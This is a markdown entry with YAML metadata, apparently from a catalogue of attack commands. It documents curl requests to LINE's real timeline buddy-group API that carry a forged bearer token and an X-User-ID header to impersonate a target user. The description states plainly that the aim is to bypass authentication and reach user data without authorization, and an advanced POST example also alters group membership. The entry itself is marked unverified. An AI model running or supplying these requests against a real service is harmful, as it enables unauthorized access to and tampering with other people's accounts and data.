---
data: >-
  curl -X GET "https://api.line.me/timeline/buddygroups" -H "Authorization:
  Bearer manipulated_token" -H "X-User-ID: target_user_id" -H "Content-Type:
  application/json"
tags:
  - auth-bypass
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: ff178974-6b13-44e1-b7ca-c71791b20165
created_at: '2025-12-14T17:32:29.361Z'
updated_at: '2025-12-14T17:32:29.361Z'
verified: false
validated: true
submitted: true
---
# curl-bypass-auth-headers

## Command

```bash
curl -X GET "https://api.line.me/timeline/buddygroups" \
  -H "Authorization: Bearer manipulated_token" \
  -H "X-User-ID: target_user_id" \
  -H "Content-Type: application/json"
```

## Description

This curl command sends an HTTP request to the LINE TIMELINE buddy group API with manipulated headers to bypass authentication, allowing unauthorized access to user data. Use it to test or exploit auth logic flaws by forging user identity headers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies the HTTP method for querying buddy groups | Yes |
| `"https://api.line.me/timeline/buddygroups"` | The target API endpoint URL | Yes |
| `-H "Authorization: Bearer manipulated_token"` | Forged or minimal auth header to bypass validation | Yes |
| `-H "X-User-ID: target_user_id"` | Custom header to impersonate the target user (exploit point) | Yes |
| `-H "Content-Type: application/json"` | Sets the request body format | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://api.line.me/timeline/buddygroups" \
  -H "Authorization: Bearer manipulated_token" \
  -H "X-User-ID: target_user_id" \
  -H "Content-Type: application/json"
```

### Advanced Usage

For POST modification:

```bash
curl -X POST "https://api.line.me/timeline/buddygroups" \
  -H "Authorization: Bearer manipulated_token" \
  -H "X-User-ID: target_user_id" \
  -H "Content-Type: application/json" \
  -d '{"group_name": "test", "members": ["id1"]}'
```

## Expected Output

Successful execution returns a JSON response with buddy group details, such as {"groups": [{"id": 123, "name": "friends"}]}. Failure due to proper auth would return 401 Unauthorized.

## Related

- [[Related Procedure|Bypass-Authentication-via-API-Header-Manipulation]]
